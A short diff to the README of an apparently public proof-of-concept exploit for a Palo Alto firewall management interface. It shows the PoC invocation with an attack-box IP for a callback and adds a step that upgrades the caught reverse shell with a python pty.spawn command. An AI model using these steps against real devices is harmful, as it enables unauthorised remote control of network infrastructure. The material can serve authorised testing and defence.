@@ -247,7 +247,11 @@ python PoC.py https://<ip_of_palo_management_interface> <ip_address_of_attack_bo
    ![image](https://github.com/user-attachments/assets/0d3b2d49-fe66-4dcb-80da-51204efebfbc)
 
    If you do not see the following, its time to troubleshoot.
-   
+
+4. To receive a more usable shell tty, use the following command: `python3 -c 'import pty; pty.spawn("/bin/bash")'`
+
+
+
 Troubleshooting steps:
    1. Use the correct IP addresses and ports in your listeners and exploit arguments
    2. Ensure there is routing to the Palo Management Interface.
